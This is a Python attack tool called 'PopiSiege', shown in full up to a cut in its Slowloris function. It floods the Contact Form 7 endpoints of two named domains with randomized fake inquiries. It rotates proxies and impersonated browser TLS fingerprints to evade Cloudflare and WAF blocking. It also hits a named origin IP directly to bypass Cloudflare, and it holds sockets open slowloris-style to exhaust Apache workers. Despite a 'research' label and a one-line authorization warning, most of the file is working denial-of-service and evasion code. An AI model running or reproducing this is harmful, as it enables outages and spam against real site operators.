#!/usr/bin/env python3
"""
PopiSiege VPS Edition
CF7 Worker Exhaustion Research Tool
Runs continuously until Ctrl+C
Proxy rotation per request — browser User-Agent

Usage:
  python3 popisiege.py
  python3 popisiege.py --target metoo-buffalo.com
  python3 popisiege.py --target metoo-shatkin.com --concurrency 30
  python3 popisiege.py --origin 104.236.68.226                   # PoC: bypass CF, hit origin directly
  python3 popisiege.py --origin 104.236.68.226 --concurrency 5   # gentle probe for log evidence
  python3 popisiege.py --slowloris --origin 104.236.68.226        # Slowloris: exhaust Apache workers
  python3 popisiege.py --slowloris --origin 104.236.68.226 --connections 200 --interval 10
  python3 popisiege.py --help
"""

import requests, time, sys, threading, itertools, argparse, subprocess
import os, socket, random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from curl_cffi import requests as cf_requests
from curl_cffi import CurlMime
from proxy_pool import make_pool

# Chrome TLS/JA3 fingerprint to impersonate — plain `requests`/curl present a
# distinct fingerprint that Cloudflare blocks even with a spoofed UA string.
IMPERSONATE = "chrome124"

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Real, current browser profiles — (curl_cffi impersonate target, matching UA).
# UA and TLS fingerprint are kept consistent on purpose: a modern TLS handshake
# paired with a stale/mismatched UA string is itself a detectable signal (tested
# against metoo-shatkin.com — an old-UA/modern-TLS mismatch wasn't flagged there,
# but other WAFs do check this, so don't rely on it holding everywhere).
BROWSER_PROFILES = [
    # Chrome desktop — every version curl_cffi can impersonate, spread across
    # Windows/Mac/Linux so no single platform dominates the pool.
    ("chrome99",  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"),
    ("chrome100", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"),
    ("chrome101", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"),
    ("chrome104", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36"),
    ("chrome107", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("chrome116", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"),
    ("chrome119", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    # Windows 11 machines still report "Windows NT 10.0" in the UA string —
    # Microsoft never bumped the NT kernel version token for web compat.
    ("chrome123", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome131", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome133a","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"),
    ("chrome136", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
    ("chrome142", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"),
    ("chrome145", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"),
    ("chrome146", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"),

    # Chrome Android
    ("chrome99_android",  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"),
    ("chrome131_android", "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"),

    # Edge (Chromium-based, distinct TLS stack from plain Chrome in curl_cffi)
    ("edge99",  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30"),
    ("edge101", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53"),

    # Safari desktop (macOS)
    ("safari153",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15"),
    ("safari155",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"),
    ("safari170",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"),
    ("safari180",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"),
    ("safari184",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15"),
    ("safari260",  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15"),
    ("safari2601", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15"),

    # Safari iOS
    ("safari172_ios", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"),
    ("safari180_ios", "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"),
    ("safari184_ios", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1"),
    ("safari260_ios", "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1"),

    # Firefox
    ("firefox133", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("firefox135", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"),
    ("firefox144", "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0"),
    ("firefox147", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0"),
]

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

# ── known targets ─────────────────────────────────────────────────────────────
TARGETS = {
    "metoo-shatkin.com": {
        "url":      "https://metoo-shatkin.com/wp-json/contact-form-7/v1/contact-forms/50/feedback",
        "form_id":  "50",
        "unit_tag": "wpcf7-f50-p30-o1",
        "threshold": 19,
    },
    "metoo-buffalo.com": {
        "url":      "https://metoo-buffalo.com/wp-json/contact-form-7/v1/contact-forms/248/feedback",
        "form_id":  "248",
        "unit_tag": "wpcf7-f248-p850-o1",
        "threshold": 25,
    },
}


# ─────────────────────────────────────────────────────────────────────────────
#  BROWSER PROFILE CYCLE — round-robin like ProxyPool, so a single burst never
#  repeats a profile until the whole pool is exhausted (random.choice could
#  pick the same one twice by chance; this guarantees it doesn't).
# ─────────────────────────────────────────────────────────────────────────────

class ProfileCycle:
    def __init__(self, profiles):
        self.profiles = profiles
        self._cycle = itertools.cycle(profiles)
        self._lock  = threading.Lock()

    def next(self):
        with self._lock:
            return next(self._cycle)


PROFILE_CYCLE = ProfileCycle(BROWSER_PROFILES)

# Set by --fixed-profile for controlled A/B testing: when not None, every
# request uses this single (impersonate, ua) pair instead of rotating —
# lets you isolate "does profile rotation matter" from "did the block
# window just reset" by running rotating vs fixed back-to-back.
FIXED_PROFILE = None

# Set by --homepage: GET the domain's homepage instead of POSTing to the CF7
# feedback endpoint. Same proxy pool / profile rotation / concurrency infra,
# different request — isolates whether a cached, low-cost GET behaves
# differently under flood than the always-uncached CF7 POST.
HOMEPAGE_MODE = False

LARGE_PAYLOAD = False


# ─────────────────────────────────────────────────────────────────────────────
#  PROXY POOL
# ─────────────────────────────────────────────────────────────────────────────

class ProxyPool:
    def __init__(self, path, rotate_interval=0):
        # rotate_interval > 0: hold ONE proxy fixed for that many seconds,
        # then advance to the next — instead of a new proxy every request.
        self.rotate_interval = rotate_interval
        # Authenticated proxy lists (Webshare etc.) ship as bare host:port —
        # credentials come from PROXY_USER/PROXY_PASS env vars at load time,
        # so no secret ever lands in a file that could get committed.
        user = os.environ.get("PROXY_USER", "")
        pw   = os.environ.get("PROXY_PASS", "")
        with open(path) as f:
            raw = [l.strip() for l in f if l.strip()]
        self.proxies = []
        for p in raw:
            if p.startswith(("http://", "https://", "socks")):
                self.proxies.append(p)
            elif "@" in p:
                # host:port:user:pass  (Webshare export format)
                parts = p.split(":")
                if len(parts) == 4:
                    h, port, u, pwd = parts
                    self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
                else:
                    self.proxies.append(f"http://{p}")
            elif p.count(":") == 3:
                # host:port:user:pass  (Webshare export format)
                h, port, u, pwd = p.split(":")
                self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
            elif user and pw:
                self.proxies.append(f"http://{user}:{pw}@{p}")
            else:
                self.proxies.append(f"http://{p}")
        self._cycle = itertools.cycle(self.proxies)
        self._lock  = threading.Lock()
        self._dead  = set()
        mode = (f"sticky per slot, rotates every {self.rotate_interval}s"
                if self.rotate_interval > 0 else "round-robin per request")
        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path} ({mode})")

    def next(self, slot=None):
        with self._lock:
            if self.rotate_interval > 0:
                # Each concurrent slot (thread) gets its OWN proxy — never share
                # one proxy across concurrent requests, that serializes them on
                # a single backbone connection slot and causes timeouts. Every
                # slot's assigned proxy shifts together once per interval.
                n = len(self.proxies)
                generation = int(time.time() // self.rotate_interval)
                base = (slot if slot is not None else 0) % n
                for offset in range(n):
                    idx = (base + generation + offset) % n
                    p = self.proxies[idx]
                    if p not in self._dead:
                        return p
                return None

            for _ in range(len(self.proxies)):
                p = next(self._cycle)
                if p not in self._dead:
                    return p
        return None

    def mark_dead(self, proxy):
        with self._lock:
            self._dead.add(proxy)

    def alive(self):
        return len(self.proxies) - len(self._dead)

    def refresh(self, proxy_file):
        """Reset dead set and cycle through bundled proxies again."""
        print(f"\n  {Y}[PROXY]{W} Pool exhausted — resetting and cycling through proxies again...\n")
        with self._lock:
            self._dead  = set()
            self._cycle = itertools.cycle(self.proxies)
        print(f"\n  {G}[PROXY]{W} Reset — {len(self.proxies)} proxies back in rotation.\n")


# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD — randomized per request. Identical form content (same name/email/
#  message on every submission) is itself a signature an app-level anti-spam
#  or WAF content filter can key on, independent of IP/TLS/UA.
# ─────────────────────────────────────────────────────────────────────────────

_FIRST_NAMES = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
                "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
                "Thomas","Sarah","Charles","Karen","Daniel","Nancy","Matthew","Lisa",
                "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
                "Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Thomas","Taylor",
                "Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris"]
_EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com","aol.com","protonmail.com"]
_SUBJECTS = ["Question about your services","Inquiry","Contact request","Need some information",
             "Quick question","Following up","Reaching out","General inquiry","Request for info","Hello"]
_MESSAGE_TEMPLATES = [
    (
        "Hello,\n\nI recently came across your website and I'm very interested in learning more about "
        "what you offer. I have several questions that I hope you can help me with at your earliest "
        "convenience.\n\nFirst, I'd like to understand the full scope of services available. Could you "
        "provide a detailed breakdown of what's included and any options or packages that might be "
        "relevant to my situation? I've looked through the information on your site but still have "
        "some gaps I'd like to fill before moving forward.\n\nSecond, I was wondering about the "
        "process for getting started — what are the typical timelines and what should I expect during "
        "the initial stages? Are there any prerequisites or steps I should take on my end to prepare?\n\n"
        "Third, I'm curious about pricing and whether there are any options for customization based "
        "on specific needs. I'd also appreciate knowing whether there are any introductory offers or "
        "consultations available for new clients.\n\nFinally, if you have any case studies, testimonials, "
        "or examples of past work you could share, that would be tremendously helpful in my decision-making "
        "process. I want to make sure I'm making the right choice.\n\nThank you for taking the time to "
        "read this message. I look forward to your response and hope we can connect soon to discuss further.\n\n"
        "Best regards,"
    ),
    (
        "Hi there,\n\nI hope this message finds you well. My name is [name] and I'm reaching out because "
        "I came across your website while searching for services in this area. I was immediately impressed "
        "by what I saw and wanted to get in touch to ask a few specific questions before proceeding.\n\n"
        "To give you some background: I've been exploring various options for quite some time now and "
        "haven't found exactly what I'm looking for. Your site caught my attention because it seemed "
        "to address several of the key points that matter most to me.\n\nMy questions are as follows:\n"
        "1. What is the typical response time once I submit an inquiry?\n"
        "2. Do you work with clients in my area or is this primarily a remote service?\n"
        "3. Are there any minimum requirements or commitments involved?\n"
        "4. How do you handle situations where the initial expectations aren't met?\n"
        "5. What sets you apart from other providers offering similar services?\n\n"
        "I realize this is quite a few questions, so please feel free to answer at whatever level of "
        "detail is convenient for you. Even a brief overview would be a good starting point.\n\n"
        "I'm looking forward to hearing back from you. Please don't hesitate to reach out by phone "
        "or email if that would be easier. Thank you again for your time and consideration.\n\n"
        "Warm regards,"
    ),
    (
        "Good day,\n\nI'm writing to express my interest in the services your organization provides. "
        "I've done some initial research and believe there may be a good fit here, but I'd like to "
        "gather more information before committing to anything.\n\nOver the past few months I've been "
        "evaluating a number of options and have narrowed my search down to a shortlist of providers, "
        "of which you are one. The key factors I'm weighing include reliability, communication, "
        "turnaround time, and overall value for money.\n\nI have a few specific questions I'd love "
        "answered if possible:\n\n- Can you walk me through what a typical engagement looks like from "
        "start to finish?\n- How do you communicate progress or updates throughout the process?\n"
        "- What happens if something doesn't go as planned or if revisions are needed?\n"
        "- Do you have any references I could speak with who have used your services in a similar capacity?\n\n"
        "Additionally, I'd like to understand what the onboarding process looks like and what you'd "
        "need from me to get things moving quickly. I'm hoping to make a decision within the next "
        "two to three weeks.\n\nPlease feel free to share any brochures, proposals, or additional "
        "materials that might be useful. I'll review everything carefully before following up.\n\n"
        "Thank you very much for your assistance and I hope to speak with you soon.\n\nSincerely,"
    ),
    (
        "Hello,\n\nI hope you don't mind me reaching out directly. I found your contact information "
        "on your website and wanted to get in touch with some questions that I couldn't find answers "
        "to in your FAQ or existing resources.\n\nI'm currently in the planning stages of a project "
        "and I believe your expertise could be exactly what I need. However, before I move forward, "
        "I want to make sure I fully understand the scope and limitations of what you offer.\n\n"
        "Specifically, I'd like to know:\n\n1. Do you offer consultations prior to engagement, and "
        "if so, is there a fee associated with that?\n2. What is your current availability like? I'm "
        "hoping to begin within the next month or so.\n3. Are contracts or agreements involved, or is "
        "this handled on a more informal basis?\n4. How do payments typically work — is it upfront, "
        "milestone-based, or upon completion?\n5. Do you have experience with projects similar to "
        "what I have in mind?\n\nI'd also love to schedule a brief call if that's possible, even "
        "just 15-20 minutes to discuss things at a high level. That would help me determine if "
        "this is the right direction to pursue.\n\nThank you so much for your time. I look forward "
        "to hearing from you and appreciate your willingness to engage with potential clients at "
        "this stage.\n\nBest,"
    ),
    (
        "Hi,\n\nI came across your site recently and wanted to reach out. I have a few questions "
        "and would appreciate any information you could share.\n\nBackground on my situation: I've "
        "been looking into this for several months and have spoken with a few different providers. "
        "I haven't committed to anything yet because I want to make sure I find the right fit for "
        "my specific needs, which are somewhat particular.\n\nThe main things I'm trying to understand "
        "are: the overall process from inquiry to completion, expected timelines, what support looks "
        "like during and after, and how issues or changes are handled mid-way through.\n\n"
        "I'm also keen to understand what makes your approach different from others I might be "
        "considering. Not looking for a sales pitch — just an honest overview of your strengths "
        "and any limitations I should be aware of upfront.\n\nIf you have availability for a brief "
        "chat this week or next, I'd welcome that. Otherwise, a detailed written response to the "
        "points above would be very helpful and much appreciated.\n\nThank you for reading and I "
        "hope to hear from you soon.\n\nKind regards,"
    ),
    (
        "Hello,\n\nI'm reaching out because I'd like to learn more about what you do and whether "
        "it might be a good match for what I need. I found your website through a search and was "
        "encouraged by what I read there.\n\nI have a number of questions, some of which are fairly "
        "detailed, so I apologize in advance for the length of this message. I want to be thorough "
        "so that you can give me the most accurate information possible.\n\nFirstly, can you tell me "
        "more about your background and experience in this area? How long have you been operating and "
        "what types of clients do you typically work with? Are there particular industries or situations "
        "where you specialize?\n\nSecondly, I'd like to understand the typical workflow. Once I reach "
        "out and we determine there's a fit, what happens next? What are the key steps, and roughly "
        "how long does each stage take?\n\nThirdly, what does success look like from your perspective? "
        "How do you measure outcomes and what does a positive result typically look like for a client?\n\n"
        "Finally, I'd be curious about any common pitfalls or mistakes you've seen clients make that "
        "I should be aware of going in.\n\nThank you for considering my questions. I'm genuinely "
        "interested and hope we can have a productive conversation.\n\nAll the best,"
    ),
    (
        "Dear team,\n\nI'm writing to request some information about your services. I've been "
        "referred to you by a colleague who spoke highly of their experience, and I'm now exploring "
        "whether this might be appropriate for my own situation.\n\nI'll try to be as specific as "
        "possible about what I'm looking for so you can give me the most useful response.\n\n"
        "My primary concern at this stage is understanding the basics: what's included, what's not, "
        "and what the realistic expectations should be for someone in my position. I've seen some "
        "information on your site but still have gaps that I'm hoping you can fill.\n\n"
        "Some of my key questions:\n- What's the best way to get started if I decide to proceed?\n"
        "- Is there a waiting list or can you typically accommodate new clients quickly?\n"
        "- How do you handle situations where things don't go as expected?\n"
        "- Are there any additional costs I should anticipate beyond the primary service fee?\n"
        "- Do you offer any kind of guarantee or assurance of quality?\n\n"
        "I'd appreciate as much detail as you're able to provide. I'm in the process of making a "
        "decision and your response will help me determine whether to move forward with you or "
        "continue looking at other options.\n\nThank you very much for your time and I look forward "
        "to your reply.\n\nWith appreciation,"
    ),
    (
        "Hi,\n\nI hope this finds you well. I wanted to take a moment to reach out and introduce "
        "myself and explain why I'm contacting you today.\n\nI've been doing a fair amount of "
        "research in this space over the past few weeks and have been impressed by several providers, "
        "including yourself. I'm now at the stage where I need to start making some decisions and "
        "wanted to gather a bit more information before doing so.\n\nMy questions are varied but "
        "all relate to understanding what it would be like to work with you:\n\n"
        "1. How responsive is your team typically? What's the best way to get in touch if I need "
        "a quick answer to something?\n"
        "2. How do you handle feedback and revisions? Is there a defined process for this?\n"
        "3. What's your policy if I'm not satisfied with the results?\n"
        "4. Can you share examples of work you've done for clients with needs similar to mine?\n"
        "5. What does the communication look like throughout the engagement — weekly updates, "
        "on-demand, or something else?\n\n"
        "I realize these are fairly standard questions, but I find that the answers tell me a lot "
        "about how a provider operates and whether they'd be a good match for my working style.\n\n"
        "Looking forward to your response. Please feel free to reach out if you'd prefer to talk "
        "through things over a call rather than back and forth by email.\n\nThanks,"
    ),
]

_EXTRA_FIELD_KEYS = [
    "company", "phone", "website", "city", "country", "zip-code",
    "how-did-you-hear", "budget", "timeline", "additional-notes",
    "preferred-contact", "availability", "project-type", "referral-source",
    "industry", "team-size", "current-solution", "pain-points",
    "decision-timeline", "stakeholders", "previous-vendors", "goals",
]
_EXTRA_FIELD_VALUES = [
    "Yes, please follow up at your earliest convenience. I'm actively evaluating options right now and would appreciate a prompt response so I can include you in my final comparison before making a decision.",
    "Flexible — open to discussing options further. I've been researching this for about three months and have a shortlist of providers. Your approach stood out and I'd love to understand more about how you differentiate from competitors.",
    "Within the next 30 days ideally. We have a board presentation coming up and I'd like to have a solution in place or at least a concrete proposal to present. Timing is important but quality matters more.",
    "No strong preference, whatever works best for your team. We're a small organization so we tend to adapt to our partners' workflows rather than impose our own. Ease of collaboration is a key factor for us.",
    "Happy to provide more details if needed. I can share documentation, current processes, and background materials. Just let me know what would be most useful for you to review before our first conversation.",
    "Please feel free to reach out by phone or email — whichever is easier for your team. I'm generally available during business hours and try to respond within a few hours to any message. Looking forward to connecting.",
    "This is quite time-sensitive so a prompt reply would be greatly appreciated. We had a previous vendor fall through at the last minute and are now scrambling to find a reliable replacement as quickly as possible.",
    "Referral from a colleague who worked with you on a project last year. They spoke very highly of the quality of communication and the end results. That endorsement carries a lot of weight in my evaluation process.",
    "Saw your listing online and was impressed by the client reviews and case studies. I've been in this industry for over a decade and can tell a lot about a provider from how they present their work and handle feedback.",
    "Have been considering this for a while and finally ready to proceed. We did an internal feasibility study and the conclusion was clear — bringing in outside expertise is the right move at this stage of our growth.",
    "Our current solution is no longer meeting our needs. It worked fine in the early stages but we've outgrown it and need something more robust that can scale with us over the next two to three years.",
    "The main pain points are turnaround time and communication gaps. We've dealt with vendors who go quiet for days at a time, so responsiveness and proactive updates are at the top of our requirements list.",
    "We have about four to six stakeholders involved in the final decision. I'm the primary point of contact and will be gathering input from each of them, but the final call rests with our director and myself.",
    "Previous vendors have let us down on delivery timelines and post-project support. We need someone who stands behind their work and is available for follow-up questions even after the main engagement is complete.",
]

def random_payload_fields():
    first = random.choice(_FIRST_NAMES)
    last  = random.choice(_LAST_NAMES)
    name  = f"{first} {last}"
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(_EMAIL_DOMAINS)}"
    return {
        "name":    name,
        "email":   email,
        "subject": random.choice(_SUBJECTS),
        "message": random.choice(_MESSAGE_TEMPLATES),
    }


def build_files(form_id, unit_tag):
    f = random_payload_fields()
    return {
        "_wpcf7":          (None, form_id),
        "_wpcf7_version":  (None, "6.1.6"),
        "_wpcf7_locale":   (None, "en_US"),
        "_wpcf7_unit_tag": (None, unit_tag),
        "your-name":       (None, f["name"]),
        "your-email":      (None, f["email"]),
        "your-subject":    (None, f["subject"]),
        "your-message":    (None, f["message"]),
    }


MSG_REPEAT = 1

def build_multipart(form_id, unit_tag, large_payload=False):
    """curl_cffi needs CurlMime, not the requests-style files dict."""
    f = random_payload_fields()
    msg = f["message"]
    if MSG_REPEAT > 1:
        msg = ("\n\n---\n\n".join([msg] * MSG_REPEAT))
    mp = CurlMime()
    mp.addpart(name="_wpcf7", data=form_id)
    mp.addpart(name="_wpcf7_version", data="6.1.6")
    mp.addpart(name="_wpcf7_locale", data="en_US")
    mp.addpart(name="_wpcf7_unit_tag", data=unit_tag)
    mp.addpart(name="your-name", data=f["name"])
    mp.addpart(name="your-email", data=f["email"])
    mp.addpart(name="your-subject", data=f["subject"])
    mp.addpart(name="your-message", data=msg)
    if large_payload:
        extra_keys = random.sample(_EXTRA_FIELD_KEYS, k=random.randint(8, 14))
        for key in extra_keys:
            mp.addpart(name=key, data=random.choice(_EXTRA_FIELD_VALUES))
    return mp


# ─────────────────────────────────────────────────────────────────────────────
#  SINGLE REQUEST
# ─────────────────────────────────────────────────────────────────────────────

def send_one(req_num, cfg, pool):
    proxy = None
    if pool is not None:
        proxy = pool.next(slot=req_num)
        if not proxy:
            return req_num, 0, 0, "N/A", "none", "all proxies dead", "N/A"

    domain = cfg["url"].split("/")[2]
    label  = proxy if proxy else "direct (own IP)"
    if FIXED_PROFILE is not None:
        impersonate, ua = FIXED_PROFILE
    else:
        impersonate, ua = PROFILE_CYCLE.next()

    t0 = time.time()
    try:
        if HOMEPAGE_MODE:
            r = cf_requests.get(
                f"https://{domain}/",
                headers={"User-Agent": ua},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                impersonate=impersonate,
                timeout=25,
            )
        else:
            r = cf_requests.post(
                cfg["url"],
                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"], large_payload=LARGE_PAYLOAD),
                headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                impersonate=impersonate,
                timeout=25,
            )
        elapsed = time.time() - t0
        cache   = r.headers.get("cf-cache-status", "N/A")
        ls_cache = r.headers.get("x-litespeed-cache", "")
        if ls_cache:
            cache = f"{cache}/ls:{ls_cache}"
        mit     = r.headers.get("cf-mitigated", "")
        # cf-mitigated present = Cloudflare intercepted, not the origin
        code    = r.status_code if not mit else 999
        return req_num, code, elapsed, cache, label, (f"cf-mitigated={mit}" if mit else None), impersonate
    except Exception as e:
        elapsed = time.time() - t0
        if pool is not None:
            pool.mark_dead(proxy)
        return req_num, 0, elapsed, "N/A", label, str(e)[:40], impersonate


def send_one_direct(req_num, cfg, origin_ip):
    """
    --origin mode: bypass Cloudflare entirely.
    Hits origin IP directly with Host header — appears in Apache logs
    WITHOUT CF-Connecting-IP header. Proves direct origin attack for PoC/legal.
    """
    domain   = cfg["url"].split("/")[2]
    path     = "/" + "/".join(cfg["url"].split("/")[3:])
    # Use HTTP (port 80) — HTTPS would fail cert check on raw IP
    url      = f"http://{origin_ip}{path}"

    s = requests.Session()
    s.headers.update({
        "User-Agent": BROWSER_UA,
        "Host":       domain,
        "Origin":     f"https://{domain}",
        "Referer":    f"https://{domain}/",
    })
    s.verify = False

    t0 = time.time()
    try:
        r       = s.post(url, files=build_files(cfg["form_id"], cfg["unit_tag"]), timeout=15)
        elapsed = time.time() - t0
        # Key evidence: CF-Connecting-IP absent = direct hit, not CF-proxied
        cf_ip   = r.headers.get("CF-Connecting-IP", "ABSENT")
        via_cf  = r.headers.get("Via", "ABSENT")
        return req_num, r.status_code, elapsed, cf_ip, via_cf, None
    except Exception as e:
        elapsed = time.time() - t0
        return req_num, 0, elapsed, "ABSENT", "ABSENT", str(e)[:60]


# ─────────────────────────────────────────────────────────────────────────────
#  SLOWLORIS
# ─────────────────────────────────────────────────────────────────────────────

def _sl_open_socket(host, port, domain):
    """
    Slowloris socket init: complete TCP handshake, send partial HTTP headers.
    Never sends the final blank line — server hangs waiting for the rest.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((host, port))
        s.send(f"GET /?r={random.randint(0, 99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {domain}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
               b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n")
        s.send(b"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n")
        s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
        s.send(b"Connection: keep-alive\r\n")
        # intentionally NO final \r\n — request stays incomplete
        return s
    except socket.error:
        try: s.close()
        except: pass
        return None


def _sl_server_alive(host, port, domain):
    """Quick HEAD check — returns True if server responds at all."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        s.send(f"HEAD / HTTP/1.0\r\nHost: {domain}\r\n\r\n".encode())
        resp = s.recv(16)
        s.close()
        return len(resp) > 0
    except Exception:
        try: s.close()
        except: pass
        return False


def run_slowloris(host, port, domain, max_connections, interval):
    """
    Slowloris attack: hold open max_connections partial-HTTP sockets.
    Every interval seconds, drip one header line to reset server timeout.
    Apache's MaxRequestWorkers (default 150) fills up → new requests refused.
    """
    sockets       = []
    total_dead    = 0
    start         = time.time()

    print(f"""
{B}{'='*66}{W}
  PopiSiege — SLOWLORIS MODE
{B}{'='*66}{W}
  Target      : {host}:{port}
  Domain      : {domain}
  Connections : up to {max_connections}
  Drip rate   : every {interval}s
  Attack      : Partial HTTP headers — never complete request
  Effect      : Exhausts Apache MaxRequestWorkers (~150 default)
{R}  WARNING     : Authorized targets only.{W}
{B}{'='*66}{W}
""")

    # ── Phase 1: flood open connections ──────────────────────────────────────
    print(f"  {Y}[PHASE 1]{W} Opening {max_connections} sockets...")
    for i in range(max_connections):
        s = _sl_open_socket(host, port, domain)
        if s:
            sockets.append(s)
        if (i+1) % 25 == 0 or i == max_connections - 1:
            failed = (i+1) - len(sockets)
            print(f"\r    Opened={len(sockets)}  Failed={failed}  ({i+1}/{max_connections})",
                  end="", flush=True)
